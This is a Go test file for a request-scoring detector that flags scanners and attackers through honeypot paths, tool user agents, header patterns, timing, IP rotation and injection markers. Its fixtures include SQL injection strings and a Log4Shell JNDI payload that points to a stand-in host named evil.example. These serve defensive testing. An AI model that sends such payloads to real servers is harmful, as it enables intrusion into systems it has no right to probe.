package detector

import (
	"net/http"
	"net/http/httptest"
	"testing"
	"time"
)

func newScorer() (*Scorer, *Tracker) {
	t := NewTracker(90)
	s := NewScorer(t, []string{"/admin-panel-v2", "/api/internal/debug"}, []string{"127.0.0.1"})
	return s, t
}

func TestTrustedIPBypass(t *testing.T) {
	s, _ := newScorer()
	r := httptest.NewRequest("GET", "/admin-panel-v2", nil)
	score := s.Score("127.0.0.1", r)
	if score.Total != 0 {
		t.Fatalf("trusted IP should score 0, got %d", score.Total)
	}
}

func TestHoneypotHitScores(t *testing.T) {
	s, _ := newScorer()
	r := httptest.NewRequest("GET", "/admin-panel-v2", nil)
	score := s.Score("10.0.0.1", r)
	found := false
	for _, sig := range score.Signals {
		if sig.Name == "honeypot_hit" {
			found = true
			if sig.Points < 50 {
				t.Errorf("honeypot first-hit points should be >= 50, got %d", sig.Points)
			}
		}
	}
	if !found {
		t.Fatal("expected honeypot_hit signal")
	}
}

func TestSuspiciousUserAgent(t *testing.T) {
	s, _ := newScorer()
	cases := []string{
		"python-requests/2.28.0",
		"sqlmap/1.7.2#stable",
		"Nuclei - Open-source project",
		"go-http-client/1.1",
	}
	for _, ua := range cases {
		r := httptest.NewRequest("GET", "/", nil)
		r.Header.Set("User-Agent", ua)
		score := s.Score("10.0.0.2", r)
		hit := false
		for _, sig := range score.Signals {
			if sig.Name == "suspicious_ua" {
				hit = true
			}
		}
		if !hit {
			t.Errorf("UA %q should trigger suspicious_ua", ua)
		}
	}
}

func TestEmptyUserAgent(t *testing.T) {
	s, _ := newScorer()
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Del("User-Agent")
	score := s.Score("10.0.0.3", r)
	found := false
	for _, sig := range score.Signals {
		if sig.Name == "empty_ua" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected empty_ua signal")
	}
}

func TestSparseHeaders(t *testing.T) {
	s, _ := newScorer()
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0 (compatible)") // benign UA
	// No Accept-Language, Sec-Fetch-*, etc.
	score := s.Score("10.0.0.4", r)
	found := false
	for _, sig := range score.Signals {
		if sig.Name == "sparse_headers" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected sparse_headers signal")
	}
}

func TestBrowserLikeHeadersNoSparseSignal(t *testing.T) {
	s, _ := newScorer()
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
	r.Header.Set("Accept-Language", "en-US,en;q=0.9")
	r.Header.Set("Accept-Encoding", "gzip, deflate, br")
	r.Header.Set("Sec-Fetch-Site", "same-origin")
	r.Header.Set("Sec-Fetch-Mode", "navigate")
	score := s.Score("10.0.0.5", r)
	for _, sig := range score.Signals {
		if sig.Name == "sparse_headers" {
			t.Errorf("browser-like headers should not trigger sparse_headers, got %v", sig)
		}
	}
}

func TestToolchainProgression(t *testing.T) {
	s, _ := newScorer()
	paths := []string{
		"/robots.txt",       // recon
		"/sitemap.xml",      // recon
		"/admin",            // probe
		"/login",            // probe
		"/?id=1'%20or%201=1--", // exploit marker (space escaped for httptest.NewRequest)
	}
	client := "10.0.0.6"
	var score Score
	for _, p := range paths {
		r := httptest.NewRequest("GET", p, nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		score = s.Score(client, r)
	}
	found := false
	for _, sig := range score.Signals {
		if sig.Name == "toolchain_full" {
			found = true
		}
	}
	if !found {
		t.Fatalf("full recon+probe+exploit sequence should trigger toolchain_full, signals=%v",
			score.Signals)
	}
}

func TestRegularTimingSignal(t *testing.T) {
	s, tr := newScorer()
	client := "10.0.0.7"
	// Fabricate 8 events spaced exactly 3 seconds apart ending ~3 seconds
	// before now, so the scoring request adds one more 3s gap to the window.
	base := time.Now().Add(-27 * time.Second)
	for i := 0; i < 8; i++ {
		tr.Record(client, ClientEvent{
			Timestamp: base.Add(time.Duration(i*3) * time.Second),
			Path:      "/",
			Method:    "GET",
		})
	}
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("User-Agent", "Mozilla/5.0")
	score := s.Score(client, r)
	found := false
	for _, sig := range score.Signals {
		if sig.Name == "regular_timing" {
			found = true
		}
	}
	if !found {
		t.Fatalf("uniform 3s gaps should trigger regular_timing, signals=%v", score.Signals)
	}
}

func TestScoreCapsAt100(t *testing.T) {
	s, _ := newScorer()
	r := httptest.NewRequest("GET", "/admin-panel-v2?id=1'%20union%20select--", nil)
	r.Header.Set("User-Agent", "sqlmap/1.7")
	score := s.Score("10.0.0.8", r)
	if score.Total > 100 {
		t.Errorf("score must be capped at 100, got %d", score.Total)
	}
}

// Ensure multiple requests don't produce nil pointer panics through the happy path.
func TestMultipleRequestsNoCrash(t *testing.T) {
	s, _ := newScorer()
	for i := 0; i < 50; i++ {
		r := httptest.NewRequest("GET", "/some/path", nil)
		r.Header.Set("User-Agent", "test")
		s.Score("10.0.0.9", r)
	}
}

// Guard: Score returns a non-nil result even with a bare request.
func TestMinimalRequest(t *testing.T) {
	s, _ := newScorer()
	r, _ := http.NewRequest("GET", "http://example.com/", nil)
	_ = s.Score("10.0.0.10", r)
}

// TestNewScannerSignals exercises the rules we added after reverse-engineering
// a Nikto / dirsearch / nuclei traffic capture. These tools rotate UAs and
// slip past suspicious_user_agents, so we need path- and payload-based
// signals to stop them.
func TestNewScannerSignals(t *testing.T) {
	t.Run("wordlist_path fires on dirsearch-style probes", func(t *testing.T) {
		s, _ := newScorer()
		r := httptest.NewRequest("GET", "/manager/html", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0) Chrome/120")
		score := s.Score("10.1.0.1", r)
		if !hasSignal(score, "wordlist_path") {
			t.Fatalf("/manager/html should trip wordlist_path; got %v", score.Signals)
		}
	})

	t.Run("injection_marker fires on log4shell jndi payload", func(t *testing.T) {
		s, _ := newScorer()
		r := httptest.NewRequest("GET", "/", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		r.Header.Set("X-Forwarded-For", "${jndi:ldap://evil.example/a}")
		score := s.Score("10.1.0.2", r)
		if !hasSignal(score, "injection_marker") {
			t.Fatalf("jndi in XFF header should trip injection_marker; got %v", score.Signals)
		}
	})

	t.Run("injection_marker fires on sqli in query", func(t *testing.T) {
		s, _ := newScorer()
		r := httptest.NewRequest("GET", "/search?q=1%27%20UNION%20SELECT%20password", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		score := s.Score("10.1.0.3", r)
		if !hasSignal(score, "injection_marker") {
			t.Fatalf("UNION SELECT in query should trip injection_marker; got %v", score.Signals)
		}
	})

	t.Run("oob_interaction fires on interactsh OAST host", func(t *testing.T) {
		s, _ := newScorer()
		r := httptest.NewRequest("GET", "/", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0")
		r.Header.Set("Referer", "https://abc.oast.me/")
		score := s.Score("10.1.0.4", r)
		if !hasSignal(score, "oob_interaction") {
			t.Fatalf(".oast.me in Referer should trip oob_interaction; got %v", score.Signals)
		}
	})

	t.Run("path_bruteforce fires after many distinct paths", func(t *testing.T) {
		s, tr := newScorer()
		client := "10.1.0.5"
		base := time.Now().Add(-30 * time.Second)
		for i := 0; i < 60; i++ {
			tr.Record(client, ClientEvent{
				Timestamp: base.Add(time.Duration(i*100) * time.Millisecond),
				Path:      "/path/" + itoaInt(i),
				Method:    "GET",
			})
		}
		r := httptest.NewRequest("GET", "/path/extra", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0) Chrome/120")
		score := s.Score(client, r)
		if !hasSignal(score, "path_bruteforce") {
			t.Fatalf("60 distinct paths should trip path_bruteforce; got %v", score.Signals)
		}
	})

	t.Run("no false positive on clean browser traffic", func(t *testing.T) {
		s, _ := newScorer()
		r := httptest.NewRequest("GET", "/about", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124")
		r.Header.Set("Accept-Language", "en-US,en;q=0.9")
		r.Header.Set("Accept-Encoding", "gzip, deflate, br")
		// Real Chrome navigations emit a complete Sec-Fetch triple plus
		// Sec-Ch-Ua. Setting them here keeps the new sec_fetch_partial /
		// ae_browser_no_br signals from firing on a clean fixture.
		r.Header.Set("Sec-Fetch-Site", "none")
		r.Header.Set("Sec-Fetch-Mode", "navigate")
		r.Header.Set("Sec-Fetch-Dest", "document")
		score := s.Score("203.0.113.1", r)
		if score.Total != 0 {
			t.Fatalf("clean browser traffic should score 0, got %d signals=%v", score.Total, score.Signals)
		}
	})
}

func hasSignal(s Score, name string) bool {
	for _, sig := range s.Signals {
		if sig.Name == name {
			return true
		}
	}
	return false
}

// TestIPRotationSignals exercises the three new IP-rotation signals we
// added to catch attackers that cycle IPs through a proxy / VPN pool
// while keeping the same client library (UA, TLS, header set).
func TestIPRotationSignals(t *testing.T) {
	t.Run("ip_reputation fires for cloud CIDR", func(t *testing.T) {
		s, _ := newScorer()
		// 3.80.0.0/12 is in the seed-cloud list in defaults/ip_reputation.yaml.
		r := httptest.NewRequest("GET", "/", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
		score := s.Score("3.80.1.2", r)
		if !hasSignal(score, "ip_reputation") {
			t.Fatalf("AWS CIDR should trip ip_reputation; got %v", score.Signals)
		}
	})

	t.Run("ip_rotation_fleet fires when N distinct IPs share a fingerprint", func(t *testing.T) {
		s, _ := newScorer()
		// 30 distinct client IPs that all speak the same library. The
		// fleet tracker should flag the nth one.
		var last Score
		for i := 0; i < 30; i++ {
			ip := "203.0.113." + itoaInt(i+1) // TEST-NET-3 range
			r := httptest.NewRequest("GET", "/login", nil)
			r.Header.Set("User-Agent", "python-requests/2.31.0")
			last = s.Score(ip, r)
		}
		if !hasSignal(last, "ip_rotation_fleet") {
			t.Fatalf("30 distinct IPs with same UA/header set should trip ip_rotation_fleet; got %v", last.Signals)
		}
	})

	t.Run("ua_rotation fires when one IP shuffles UAs", func(t *testing.T) {
		s, _ := newScorer()
		client := "198.51.100.42"
		uas := []string{
			"Mozilla/5.0 (Windows NT 10.0) Chrome/120",
			"Mozilla/5.0 (Macintosh) Safari/605",
			"Mozilla/5.0 (X11; Linux x86_64) Firefox/121",
			"Mozilla/5.0 (iPad; CPU OS 16_5) Version/16",
			"Mozilla/5.0 (Android 13; Mobile) Chrome/120",
		}
		var last Score
		for _, ua := range uas {
			r := httptest.NewRequest("GET", "/", nil)
			r.Header.Set("User-Agent", ua)
			last = s.Score(client, r)
		}
		if !hasSignal(last, "ua_rotation") {
			t.Fatalf("five distinct UAs from one IP should trip ua_rotation; got %v", last.Signals)
		}
	})

	t.Run("no false positive: single IP, one UA, normal traffic", func(t *testing.T) {
		s, _ := newScorer()
		r := httptest.NewRequest("GET", "/about", nil)
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124")
		r.Header.Set("Accept-Language", "en-US,en;q=0.9")
		r.Header.Set("Accept-Encoding", "gzip, deflate, br")
		r.Header.Set("Sec-Fetch-Site", "none")
		r.Header.Set("Sec-Fetch-Mode", "navigate")
		score := s.Score("198.51.100.10", r)
		for _, sig := range score.Signals {
			if sig.Name == "ip_rotation_fleet" || sig.Name == "ua_rotation" {
				t.Errorf("clean browser traffic should not trip rotation signals, got %v", sig)
			}
		}
	})
}

func itoaInt(n int) string {
	if n == 0 {
		return "0"
	}
	var b [10]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}
